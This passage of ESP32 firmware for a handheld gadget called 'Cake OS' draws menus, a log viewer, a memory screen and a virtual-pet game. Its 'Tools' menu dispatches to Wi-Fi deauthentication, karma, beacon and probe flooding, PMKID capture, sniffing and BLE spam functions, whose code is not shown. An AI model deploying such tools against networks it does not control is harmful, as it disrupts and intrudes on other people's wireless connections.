    int y = 12 + (i - gameOffset) * 17;
    bool sel = (i == selectedGame);
    if (sel) tft.fillRect(0, y - 1, 160, 17, 0x0010);
    uint16_t iconColor = sel ? TFT_YELLOW : TFT_CYAN;
    drawAppIcon(3, y + 1, 20 + i, iconColor);
    tft.setTextColor(sel ? TFT_YELLOW : TFT_WHITE, sel ? 0x0010 : TFT_BLACK);
    tft.drawString((sel ? "> " : "  ") + String(gameMenu[i]), 20, y + 3);
  }
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
}

void drawHackMenu() {
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("Tools", 2, 0);
  lastWifiDisplay = -1;
  updateWifiStatusBar();
  if (hackOffset > hackMenuCount - 4) hackOffset = hackMenuCount - 4;
  if (hackOffset < 0) hackOffset = 0;
  for (int i = hackOffset; i < hackOffset + 4 && i < hackMenuCount; i++) {
    int y = 12 + (i - hackOffset) * 17;
    bool sel = (i == selectedHack);
    if (sel) tft.fillRect(0, y - 1, 160, 17, 0x0010);
    uint16_t iconColor = sel ? TFT_YELLOW : TFT_CYAN;
    drawAppIcon(3, y + 1, i, iconColor);
    tft.setTextColor(sel ? TFT_YELLOW : TFT_WHITE, sel ? 0x0010 : TFT_BLACK);
    tft.drawString((sel ? "> " : "  ") + String(hackMenu[i]), 20, y + 3);
  }
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
}

void showGameMenu() {
  while (true) {
    drawGameMenu();
    char k = getKey();
    if (k == 'U') { selectedGame--; if (selectedGame < 0) selectedGame = gameMenuCount - 1; }
    else if (k == 'D') { selectedGame++; if (selectedGame >= gameMenuCount) selectedGame = 0; }
    else if (k == 'L') {
      switch (selectedGame) {
        case 0: showTetris(); break;
        case 1: showBreakout(); break;
        case 2: showSnake(); break;
        case 3: showDinoRun(); break;
        case 4: showFlappyBird(); break;
        case 5: show2048(); break;
        case 6: showPlaneWar(); break;
        case 7: showMinesweeper(); break;
        case 8: showRoguelike(); break;
      }
      continue;
    } else if (k == 'R' || k == 'E') return;
    if (selectedGame < gameOffset) gameOffset = selectedGame;
    if (selectedGame >= gameOffset + 4) gameOffset = selectedGame - 3;
    delay(20);
  }
}

void showHackerMenu() {
  while (true) {
    drawHackMenu();
    if (millis() - lastWifiCheck > 500) { lastWifiCheck = millis(); updateWifiStatusBar(); }
    char k = getKey();
    if (k == 'U') { selectedHack--; if (selectedHack < 0) selectedHack = hackMenuCount - 1; }
    else if (k == 'D') { selectedHack++; if (selectedHack >= hackMenuCount) selectedHack = 0; }
    else if (k == 'L') {
      switch (selectedHack) {
        case 0: showWifiScan(); break;
        case 1: showIPScan(); break;
        case 2: showDeauth(); break;
        case 3: showKarma(); break;
        case 4: showProbeFlood(); break;
        case 5: showBeaconFlood(); break;
        case 6: showPMKID(); break;
        case 7: showSniffer(); break;
        case 8: showKeyEncoder(); break;
        case 9: showDeviceTracker(); break;
        case 10: showBLEScan(); break;
        case 11: showBLESpam(); break;
        case 12: showChanGraph(); break;
        case 13: showBleGatt(); break;
        case 14: showTrackerDetect(); break;
        case 15: showSettings(); break;
      }
      if (wifiConfigured) restartWifi();
      continue;
    } else if (k == 'R' || k == 'E') return;
    if (selectedHack < hackOffset) hackOffset = selectedHack;
    if (selectedHack >= hackOffset + 4) hackOffset = selectedHack - 3;
    delay(20);
  }
}

// ==================== 设置应用 ====================
#define LOG_FILE "/log.txt"

void logOverwrite(const char* title) {
  ensureLittleFS();
  File f = LittleFS.open(LOG_FILE, "w");
  if (f) {
    f.println("=== Cake OS Log ===");
    f.print("Title: "); f.println(title);
    f.print("Time:  "); f.print(millis() / 1000); f.println("s");
    f.println("---");
    f.close();
  }
}
void logAppend(const char* line) {
  ensureLittleFS();
  File f = LittleFS.open(LOG_FILE, "a");
  if (f) { f.println(line); f.close(); }
}
void logClear() {
  ensureLittleFS();
  LittleFS.remove(LOG_FILE);
  clearAll(); titleBar("Log Cleared");
  delay(800);
}

void showMemory() {
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Memory", 2, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString("Free : " + String(ESP.getFreeHeap() / 1024) + " K", 2, 16);
    tft.drawString("Min  : " + String(ESP.getMinFreeHeap() / 1024) + " K", 2, 28);
    tft.drawString("Size : " + String(ESP.getHeapSize() / 1024) + " K", 2, 40);
    tft.drawString("Sketch:" + String(ESP.getSketchSize() / 1024) + " K", 2, 52);
    tft.drawString("Flash : " + String(ESP.getFlashChipSize() / 1024 / 1024) + " MB", 2, 64);
    delay(500);
    char k = getKey();
    if (k == 'R' || k == 'E') break;
  }
}

void showLogView() {
  ensureLittleFS();
  File f = LittleFS.open(LOG_FILE, "r");
  if (!f) { clearAll(); titleBar("No Log"); waitExit(); return; }
  const int MAX_LINES = 80;
  static String lines[MAX_LINES];
  int lineCount = 0;
  while (f.available() && lineCount < MAX_LINES) {
    lines[lineCount++] = f.readStringUntil('\n');
  }
  f.close();
  if (lineCount == 0) { clearAll(); titleBar("Empty Log"); waitExit(); return; }
  int scroll = 0;
  const int VISIBLE = 6;
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Log View", 2, 0);
    char pos[16]; snprintf(pos, sizeof(pos), "%d/%d", scroll + 1, lineCount);
    tft.drawString(pos, 130, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    for (int i = 0; i < VISIBLE && scroll + i < lineCount; i++) {
      tft.drawString(lines[scroll + i].substring(0, 26), 2, 12 + i * 10);
    }
    char k = getKey();
    if (k == 'U') scroll = (scroll > 0) ? scroll - 1 : 0;
    else if (k == 'D') scroll = (scroll < lineCount - 1) ? scroll + 1 : lineCount - 1;
    else if (k == 'R' || k == 'E') break;
    delay(30);
  }
}

void showLogExport() {
  clearAll();
  titleBar("Log Export");
  tft.drawString("Open Serial Monitor", 2, 20);
  tft.drawString("Baud 115200", 2, 34);
  tft.drawString("Sending in 3s...", 2, 50);
  delay(3000);
  ensureLittleFS();
  File f = LittleFS.open(LOG_FILE, "r");
  if (!f) {
    clearAll(); titleBar("No Log File");
    tft.drawString("Nothing to export", 2, 30);
    waitExit();
    return;
  }
  Serial.println("=== CAKE OS LOG START ===");
  while (f.available()) {
    String line = f.readStringUntil('\n');
    Serial.println(line);
    delay(2);
  }
  f.close();
  Serial.println("=== CAKE OS LOG END ===");
  clearAll();
  tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawCentreString("Export Done", 80, 20, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Check serial port", 2, 44);
  waitExit();
}

void showLog() {
  int sel = 0;
  const char* items[] = {"View", "Export", "Clear"};
  const int ITEM_COUNT = 3;
  while (true) {
    clearAll();
    ensureLittleFS();
    File f = LittleFS.open(LOG_FILE, "r");
    int size = f ? f.size() : 0;
    if (f) f.close();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Log", 2, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString(String(size) + " B", 130, 0);
    for (int i = 0; i < ITEM_COUNT; i++) {
      String pre = (i == sel) ? "> " : "  ";
      tft.setTextColor(i == sel ? TFT_YELLOW : TFT_WHITE, TFT_BLACK);
      tft.drawString(pre + items[i], 2, 20 + i * 14);
    }
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    char k = getKey();
    if (k == 'U') sel = (sel + ITEM_COUNT - 1) % ITEM_COUNT;
    else if (k == 'D') sel = (sel + 1) % ITEM_COUNT;
    else if (k == 'L') {
      if (sel == 0) showLogView();
      else if (sel == 1) showLogExport();
      else if (sel == 2) logClear();
    } else if (k == 'R' || k == 'E') break;
    delay(30);
  }
}

void showSettings() {
  deinitWifi(); deinitBLE();
  int sel = 0;
  const char* items[] = {"About", "Memory", "Log"};
  const int ITEM_COUNT = 3;
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Settings", 2, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    for (int i = 0; i < ITEM_COUNT; i++) {
      String pre = (i == sel) ? "> " : "  ";
      tft.setTextColor(i == sel ? TFT_YELLOW : TFT_WHITE, TFT_BLACK);
      tft.drawString(pre + items[i], 2, 20 + i * 14);
    }
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    char k = getKey();
    if (k == 'U') sel = (sel + ITEM_COUNT - 1) % ITEM_COUNT;
    else if (k == 'D') sel = (sel + 1) % ITEM_COUNT;
    else if (k == 'L') {
      if (sel == 0) showAbout();
      else if (sel == 1) showMemory();
      else if (sel == 2) showLog();
    } else if (k == 'R' || k == 'E') break;
    delay(30);
  }
  if (wifiConfigured) restartWifi();
}

// ==================== About ====================
void showAbout() {
  clearAll(); titleBar("About");
  tft.drawString(DEVICE_NAME, 2, 20);
  tft.drawString("Ver: " + String(VERSION), 2, 34);
  tft.drawString("Author: MCXP", 2, 48);
  tft.drawString("Heap: " + String(ESP.getFreeHeap()), 2, 62);
  waitExit();
}

// ==================== 宠物机绘制 ====================
void pet2DrawFish(int cx, int cy, uint8_t mood, bool blink) {
  static uint16_t goldC = 0, darkGoldC = 0, finC = 0, eyeC = 0, bubbleC = 0;
  if (goldC == 0) {
    goldC     = tft.color565(255, 140, 40);
    darkGoldC = tft.color565(220, 90, 20);
    finC      = tft.color565(255, 180, 90);
    eyeC      = tft.color565(20, 20, 30);
    bubbleC   = tft.color565(180, 220, 255);
  }
  tft.fillTriangle(cx + 14, cy - 2, cx + 34, cy - 14, cx + 32, cy - 1, finC);
  tft.fillTriangle(cx + 14, cy + 2, cx + 34, cy + 12, cx + 32, cy + 1, finC);
  tft.fillTriangle(cx + 14, cy - 3, cx + 20, cy, cx + 14, cy + 3, goldC);
  tft.fillRoundRect(cx - 18, cy - 9, 34, 18, 9, goldC);
  tft.fillCircle(cx - 18, cy, 9, goldC);
  tft.fillRoundRect(cx - 14, cy - 7, 24, 3, 1, finC);
  tft.fillRoundRect(cx - 15, cy + 3, 26, 5, 2, finC);
  tft.fillTriangle(cx - 4, cy - 9, cx + 4, cy - 9, cx - 1, cy - 18, darkGoldC);
  tft.fillTriangle(cx - 6, cy + 8, cx + 4, cy + 8, cx - 1, cy + 15, darkGoldC);
  tft.fillTriangle(cx - 8, cy + 2, cx - 2, cy + 8, cx - 10, cy + 7, darkGoldC);
  if (blink) tft.drawFastHLine(cx - 16, cy - 3, 7, eyeC);
  else {
    tft.fillCircle(cx - 13, cy - 3, 4, TFT_WHITE);
    tft.fillCircle(cx - 12, cy - 3, 3, eyeC);
    tft.drawPixel(cx - 13, cy - 5, TFT_WHITE);
    tft.drawPixel(cx - 14, cy - 4, TFT_WHITE);
  }
  if (mood >= 50) tft.drawCircleHelper(cx - 24, cy + 2, 3, 0x0C, eyeC);
  else tft.drawFastHLine(cx - 26, cy + 3, 4, eyeC);
  if (mood >= 60) {
    tft.drawCircle(cx - 26, cy - 12, 2, bubbleC);
    if (mood >= 80) {
      tft.drawCircle(cx - 30, cy - 18, 2, bubbleC);
      tft.drawCircle(cx - 24, cy - 22, 1, bubbleC);
    }
  }
}
void pet2DrawBar(int y, const char* label, uint8_t val, uint16_t color) {
  tft.setTextColor(TFT_WHITE);
  tft.drawString(label, 2, y);
  int bx = 26, bw = 88, by = y + 1;
  tft.drawRect(bx, by, bw, 6, TFT_DARKGREY);
  int fill = ((bw - 2) * val) / 100;
  if (fill > 0) tft.fillRect(bx + 1, by + 1, fill, 4, color);
  char b[4]; snprintf(b, sizeof(b), "%d", val);
  tft.drawString(b, bx + bw + 4, y);
}

// 商店：投喂成功后自动返回主界面
void pet2ShowShop() {
  const int TOTAL = 17;
  const int GAP1 = 12;
  int sel = 0;
  int msgTimer = 0;
  char msg[28] = "";
  uint16_t msgColor = TFT_GREEN;
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Shop", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$" + String(pet2.coins), 120, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    const int visible = 6;
    int start = sel - 3;
    if (start < 0) start = 0;
    if (start > TOTAL - visible) start = TOTAL - visible;
    for (int i = 0; i < visible; i++) {
      int idx = start + i;
      if (idx >= TOTAL) break;
      int y = 12 + i * 10;
      if (idx == GAP1) {
        tft.drawFastHLine(2, y + 4, 156, TFT_DARKGREY);
        continue;
      }
      if (idx == sel) tft.fillRect(0, y - 1, 160, 10, 0x0010);
      String line;
      if (idx < GAP1) {
        line = String(PET_FOODS[idx].name) + "  $" + String(PET_FOODS[idx].cost);
      } else {
        int it = idx - GAP1 - 1;
        line = String(PET_ITEMS[it].name) + "  $" + String(PET_ITEMS[it].cost);
      }
      tft.setTextColor(idx == sel ? TFT_YELLOW : TFT_WHITE, idx == sel ? 0x0010 : TFT_BLACK);
      tft.drawString(line, 2, y);
    }
    if (msgTimer > 0) {
      tft.fillRect(0, 76, 160, 8, TFT_BLACK);
      tft.setTextColor(msgColor, TFT_BLACK);
      int len = strlen(msg);
      tft.drawString(msg, 80 - (len * 6) / 2, 76);
      msgTimer--;
    }
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    char k = getKey();
    if (k == 'U') {
      do { sel = (sel + TOTAL - 1) % TOTAL; } while (sel == GAP1);
    } else if (k == 'D') {
      do { sel = (sel + 1) % TOTAL; } while (sel == GAP1);
    } else if (k == 'L') {
      if (sel < GAP1) {
        // 食物
        if (pet2.coins >= PET_FOODS[sel].cost) {
          pet2.coins -= PET_FOODS[sel].cost;
          int8_t dH  = pet2ClampAdd(pet2.hunger, PET_FOODS[sel].dHunger);
          int8_t dM  = pet2ClampAdd(pet2.mood,   PET_FOODS[sel].dMood);
          int8_t dC  = pet2ClampAdd(pet2.clean,  PET_FOODS[sel].dClean);
          int8_t dHP = pet2ClampAdd(pet2.health, PET_FOODS[sel].dHealth);
          int8_t dE  = pet2ClampAdd(pet2.energy, PET_FOODS[sel].dEnergy);
          pet2AddExp(10); pet2AddBond(2);
          pet2.totalFeed++; pet2TaskAdd(0, 1);
          pet2Unlock(0);
          pet2Save();
          char buf[28] = "";
          char tmp[8];
          if (dH)  { snprintf(tmp, sizeof(tmp), "H%+d ",  dH);  strcat(buf, tmp); }
          if (dM)  { snprintf(tmp, sizeof(tmp), "M%+d ",  dM);  strcat(buf, tmp); }
          if (dC)  { snprintf(tmp, sizeof(tmp), "C%+d ",  dC);  strcat(buf, tmp); }
          if (dHP) { snprintf(tmp, sizeof(tmp), "HP%+d ", dHP); strcat(buf, tmp); }
          if (dE)  { snprintf(tmp, sizeof(tmp), "E%+d ",  dE);  strcat(buf, tmp); }
          strncpy(g_petMsg, buf, sizeof(g_petMsg) - 1);
          g_petMsg[sizeof(g_petMsg) - 1] = 0;
          g_petMsgColor = TFT_GREEN; g_petMsgTimer = 30;
          g_shopFed = true;
          return;
        } else {
          snprintf(msg, sizeof(msg), "Need %d$", PET_FOODS[sel].cost);
          msgColor = TFT_RED; msgTimer = 25;
        }
      } else if (sel > GAP1) {
        // 道具
        int it = sel - GAP1 - 1;
        if (pet2.coins >= PET_ITEMS[it].cost) {
          pet2.coins -= PET_ITEMS[it].cost;
          int8_t dC  = pet2ClampAdd(pet2.clean,  PET_ITEMS[it].dClean);
          int8_t dM  = pet2ClampAdd(pet2.mood,   PET_ITEMS[it].dMood);
          int8_t dHP = pet2ClampAdd(pet2.health, PET_ITEMS[it].dHealth);
          int8_t dE  = pet2ClampAdd(pet2.energy, PET_ITEMS[it].dEnergy);
          pet2AddBond(PET_ITEMS[it].dBond); pet2AddExp(8);
          pet2Save();
          char buf[28] = "";
          char tmp[8];
          if (dC)  { snprintf(tmp, sizeof(tmp), "C%+d ",  dC);  strcat(buf, tmp); }
          if (dM)  { snprintf(tmp, sizeof(tmp), "M%+d ",  dM);  strcat(buf, tmp); }
          if (dHP) { snprintf(tmp, sizeof(tmp), "HP%+d ", dHP); strcat(buf, tmp); }
          if (dE)  { snprintf(tmp, sizeof(tmp), "E%+d ",  dE);  strcat(buf, tmp); }
          strncpy(g_petMsg, buf, sizeof(g_petMsg) - 1);
          g_petMsg[sizeof(g_petMsg) - 1] = 0;
          g_petMsgColor = TFT_GREEN; g_petMsgTimer = 30;
          g_shopFed = true;
          return;
        } else {
          snprintf(msg, sizeof(msg), "Need %d$", PET_ITEMS[it].cost);
          msgColor = TFT_RED; msgTimer = 25;
        }
      }
    } else if (k == 'R' || k == 'E') break;
    delay(30);
  }
}

void pet2ShowTasks() {
  int sel = 0;
  const int TASK_TOTAL = 10;
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString("Stage " + String(pet2.stage) + "/30", 2, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    int visible = 7;
    int start = sel - 3;
    if (start < 0) start = 0;
    if (start > TASK_TOTAL - visible) start = TASK_TOTAL - visible;
    for (int i = 0; i < visible; i++) {
      int idx = start + i;
      if (idx >= TASK_TOTAL) break;
      int y = 12 + i * 9;
      String line = (idx == sel) ? "> " : "  ";
      line += (pet2.taskProgress[idx] >= 100) ? "[V] " : "[ ] ";
      line += String(TASK_TPL[idx].desc);
      if (pet2.taskProgress[idx] >= 100) tft.setTextColor(TFT_GREEN, TFT_BLACK);
      else if (idx == sel) tft.setTextColor(TFT_YELLOW, TFT_BLACK);
      else tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.drawString(line, 2, y);
      char pbuf[12]; snprintf(pbuf, sizeof(pbuf), "%d%%", pet2.taskProgress[idx]);
      tft.drawString(pbuf, 130, y);
    }
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    char k = getKey();
    if (k == 'U') sel = (sel + TASK_TOTAL - 1) % TASK_TOTAL;
    else if (k == 'D') sel = (sel + 1) % TASK_TOTAL;
    else if (k == 'L') { if (pet2StageComplete()) pet2AdvanceStage(); }
    else if (k == 'R' || k == 'E') break;
    delay(30);
  }
}

void pet2ShowStats() {
  int sel = 0;
  const int STAT_TOTAL = 10;
  const char* labels[] = {"Level", "Exp", "Bond", "Feed", "Play", "Sleep", "Clean", "Stage", "Coins", "Achs"};
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString("Stats", 2, 0);
    int visible = 7;
    int start = sel - 3;
    if (start < 0) start = 0;
    if (start > STAT_TOTAL - visible) start = STAT_TOTAL - visible;
    for (int i = 0; i < visible; i++) {
      int idx = start + i;
      if (idx >= STAT_TOTAL) break;
      int y = 12 + i * 9;
      String val;
      switch (idx) {
        case 0: val = String(pet2.level); break;
        case 1: val = String(pet2.exp) + "/" + String(pet2ExpNeeded()); break;
        case 2: val = String(pet2.bond); break;
        case 3: val = String(pet2.totalFeed); break;
        case 4: val = String(pet2.totalPlay); break;
        case 5: val = String(pet2.totalSleep); break;
        case 6: val = String(pet2.totalClean); break;
        case 7: val = String(pet2.stage) + "/30"; break;
        case 8: val = String(pet2.coins); break;
        case 9: {
          int n = 0;
          for (int a = 0; a < 8; a++) if (pet2.ach & (1 << a)) n++;
          val = String(n) + "/8";
          break;
        }
      }
      tft.setTextColor(idx == sel ? TFT_YELLOW : TFT_WHITE, TFT_BLACK);
      tft.drawString(((idx == sel) ? "> " : "  ") + String(labels[idx]), 2, y);
      tft.drawString(val, 110, y);
    }
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    char k = getKey();
    if (k == 'U') sel = (sel + STAT_TOTAL - 1) % STAT_TOTAL;
    else if (k == 'D') sel = (sel + 1) % STAT_TOTAL;
    else if (k == 'R' || k == 'E') break;
    delay(30);
  }
}

void pet2ShowAchs() {
  int sel = 0;
  const int ACH_TOTAL = 8;
  const char* names[] = {"First Meal", "First Play", "First Sleep", "First Bath", "Level 5", "Level 10", "100 Coins", "Game Win"};
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString("Achievements", 2, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    int visible = 7;
    int start = sel - 3;
    if (start < 0) start = 0;
    if (start > ACH_TOTAL - visible) start = ACH_TOTAL - visible;
    for (int i = 0; i < visible; i++) {
      int idx = start + i;
      if (idx >= ACH_TOTAL) break;
      int y = 12 + i * 9;
      bool done = (pet2.ach >> idx) & 1;
      tft.setTextColor(done ? TFT_GREEN : (idx == sel ? TFT_YELLOW : TFT_WHITE), TFT_BLACK);
      tft.drawString(((idx == sel) ? "> " : "  ") + String(done ? "[V] " : "[ ] ") + String(names[idx]), 2, y);
    }
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    char k = getKey();
    if (k == 'U') sel = (sel + ACH_TOTAL - 1) % ACH_TOTAL;
    else if (k == 'D') sel = (sel + 1) % ACH_TOTAL;
    else if (k == 'R' || k == 'E') break;
    delay(30);
  }
}

// ==================== 宠物菜单 ====================
// 修复：Play/Sleep/Clean 三个分支现在会设置 g_petMsgTimer，返回主界面后能显示 + 值提示
void showPetMenu() {
  int menuSel = 0;
  const char* items[] = {"Play", "Sleep", "Clean", "Shop", "Tasks", "Stats", "Achs"};
  const int COUNT = 7;
  char msg[24] = "";
  uint16_t msgColor = TFT_GREEN;
  int msgTimer = 0;
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Pet Menu", 2, 0);
    for (int i = 0; i < COUNT; i++) {
      String pre = (i == menuSel) ? "> " : "  ";
      tft.setTextColor(i == menuSel ? TFT_YELLOW : TFT_WHITE, TFT_BLACK);
      tft.drawString(pre + items[i], 2, 16 + i * 9);
    }
    if (msgTimer > 0) {
      tft.setTextColor(msgColor, TFT_BLACK);
      tft.drawString(msg, 2, 76);
      msgTimer--;
    }
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    char k = getKey();
    if (k == 'U') menuSel = (menuSel + COUNT - 1) % COUNT;
    else if (k == 'D') menuSel = (menuSel + 1) % COUNT;
    else if (k == 'L') {
      switch (menuSel) {
        case 0: {  // Play
          if (pet2.energy >= 5) {
            int8_t dE = pet2ClampAdd(pet2.energy, -5);
            int8_t dM = pet2ClampAdd(pet2.mood,   +12);
            int8_t dH = pet2ClampAdd(pet2.hunger, -3);
            pet2AddExp(8); pet2AddBond(1);
            pet2.totalPlay++; pet2TaskAdd(1, 1);
            pet2Unlock(1);
            char buf[28] = ""; char tmp[8];
            if (dM) { snprintf(tmp, sizeof(tmp), "M%+d ", dM); strcat(buf, tmp); }
            if (dH) { snprintf(tmp, sizeof(tmp), "H%+d ", dH); strcat(buf, tmp); }
            if (dE) { snprintf(tmp, sizeof(tmp), "E%+d ", dE); strcat(buf, tmp); }
            strncpy(g_petMsg, buf, sizeof(g_petMsg) - 1);
            g_petMsg[sizeof(g_petMsg) - 1] = 0;
            g_petMsgColor = TFT_GREEN;
            g_petMsgTimer = 25;          // ← 关键修复：返回主界面后能显示
            g_shopFed = true;
          } else {
            snprintf(msg, sizeof(msg), "Too tired!");
            msgColor = TFT_RED; msgTimer = 20;
          }
          break;
        }
        case 1: {  // Sleep
          int8_t dE = pet2ClampAdd(pet2.energy, +25);
          int8_t dM = pet2ClampAdd(pet2.mood,   -5);
          pet2.totalSleep++; pet2TaskAdd(2, 1); pet2AddExp(5);
          pet2Unlock(2);
          char buf[28] = ""; char tmp[8];
          if (dE) { snprintf(tmp, sizeof(tmp), "E%+d ", dE); strcat(buf, tmp); }
          if (dM) { snprintf(tmp, sizeof(tmp), "M%+d ", dM); strcat(buf, tmp); }
          strncpy(g_petMsg, buf, sizeof(g_petMsg) - 1);
          g_petMsg[sizeof(g_petMsg) - 1] = 0;
          g_petMsgColor = TFT_GREEN;
          g_petMsgTimer = 25;            // ← 关键修复
          g_shopFed = true;
          break;
        }
        case 2: {  // Clean
          int8_t dC = pet2ClampAdd(pet2.clean, +100);
          int8_t dM = pet2ClampAdd(pet2.mood,  +5);
          pet2.totalClean++; pet2TaskAdd(3, 1); pet2AddExp(5);
          pet2Unlock(3);
          char buf[28] = ""; char tmp[8];
          if (dC) { snprintf(tmp, sizeof(tmp), "C%+d ", dC); strcat(buf, tmp); }
          if (dM) { snprintf(tmp, sizeof(tmp), "M%+d ", dM); strcat(buf, tmp); }
          strncpy(g_petMsg, buf, sizeof(g_petMsg) - 1);
          g_petMsg[sizeof(g_petMsg) - 1] = 0;
          g_petMsgColor = TFT_GREEN;
          g_petMsgTimer = 25;            // ← 关键修复
          g_shopFed = true;
          break;
        }
        case 3: pet2ShowShop(); if (g_shopFed) { g_shopFed = false; return; } break;
        case 4: pet2ShowTasks(); break;
        case 5: pet2ShowStats(); break;
        case 6: pet2ShowAchs(); break;
      }
      if (g_shopFed) { g_shopFed = false; return; }
    } else if (k == 'R' || k == 'E') return;
    delay(20);
  }
}

// ==================== 宠物主界面 ====================
void showPetWhale() {
  deinitWifi(); deinitBLE();
  pet2Load();
  // 每进入一次主界面，属性自然衰减（钳到 0）
  pet2ClampAdd(pet2.hunger, -5);
  pet2ClampAdd(pet2.mood,   -5);
  pet2ClampAdd(pet2.clean,  -5);
  pet2Save();
  bool blink = false;
  unsigned long lastBlink = millis();
  while (true) {
    clearAll();
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString("Lv." + String(pet2.level), 2, 0);
    tft.drawString("$" + String(pet2.coins), 130, 0);
    pet2DrawFish(80, 21, pet2.mood, blink);
    if (g_petMsgTimer > 0) {
      tft.fillRect(38, 24, 84, 8, TFT_BLACK);
      tft.setTextColor(g_petMsgColor, TFT_BLACK);
      int len = strlen(g_petMsg);
      tft.drawString(g_petMsg, 80 - (len * 6) / 2, 24);
      g_petMsgTimer--;
    }
    pet2DrawBar(40, "H", pet2.hunger, TFT_RED);
    pet2DrawBar(48, "M", pet2.mood, TFT_YELLOW);
    pet2DrawBar(56, "E", pet2.energy, TFT_CYAN);
    pet2DrawBar(64, "C", pet2.clean, TFT_GREEN);
    pet2DrawBar(72, "B", pet2.bond, TFT_ORANGE);
    if (millis() - lastBlink > 3000) { lastBlink = millis(); blink = !blink; }
    char k = getKey();
    if (k == 'U') {
      if (pet2.energy >= 5) {
        int8_t dE = pet2ClampAdd(pet2.energy, -5);
        int8_t dM = pet2ClampAdd(pet2.mood,   +8);
        int8_t dH = pet2ClampAdd(pet2.hunger, -2);
        pet2AddExp(6); pet2AddBond(1);
        pet2.totalPlay++; pet2TaskAdd(1, 1);
        pet2Unlock(1);
        char buf[28] = ""; char tmp[8];
        if (dM) { snprintf(tmp, sizeof(tmp), "M%+d ", dM); strcat(buf, tmp); }
        if (dH) { snprintf(tmp, sizeof(tmp), "H%+d ", dH); strcat(buf, tmp); }
        if (dE) { snprintf(tmp, sizeof(tmp), "E%+d ", dE); strcat(buf, tmp); }
        strncpy(g_petMsg, buf, sizeof(g_petMsg) - 1);
        g_petMsg[sizeof(g_petMsg) - 1] = 0;
        g_petMsgColor = TFT_GREEN; g_petMsgTimer = 25;
      } else {
        snprintf(g_petMsg, sizeof(g_petMsg), "Tired!");
        g_petMsgColor = TFT_RED; g_petMsgTimer = 25;
      }
    } else if (k == 'D') {
      showPetMenu();
      if (pet2.energy > 100) pet2.energy = 100;
      pet2Save();
    } else if (k == 'L') {
      showGameMenu();
    } else if (k == 'R' || k == 'E') {
      showHackerMenu();
    }
    delay(20);
  }
}

// ==================== setup ====================
void setup() {
  Serial.begin(115200);
  setCpuFrequencyMhz(160);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_LEFT, INPUT_PULLUP);
  pinMode(BTN_RIGHT, INPUT_PULLUP);
  tft.init();
  tft.setRotation(3);
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Cake OS", 50, 20);
  tft.drawString("v5.0", 65, 35);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawCentreString("Loading...", 80, 55, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);

  EEPROM.begin(1024);
  pet2Load(); wifiCacheLoad(); keyLoad();
  dinoLoad(); tetLoad(); brkLoad();
  flpLoad(); g2Load(); plnLoad(); minLoad(); rogLoad();
  randomSeed(esp_random());

  if (strlen(WIFI_SSID) > 0 && strcmp(WIFI_SSID, "你的WiFi名") != 0) {
    wifiConfigured = true;
    WiFi.mode(WIFI_STA); WiFi.setSleep(false);
    esp_wifi_set_max_tx_power(80);
    if (wifiCacheValid()) WiFi.begin(WIFI_SSID, WIFI_PASSWORD, wifiCache.channel, wifiCache.bssid);
    else WiFi.begin(WIFI_SSID, WIFI_PASSWORD);
    wifiDisconnectTime = millis(); wifiDisconnectCount = 0; wifiReconnectDelay = WIFI_MIN_DELAY;
  }
  delay(200);
}

// ==================== loop ====================
void loop() {
  showPetWhale();
}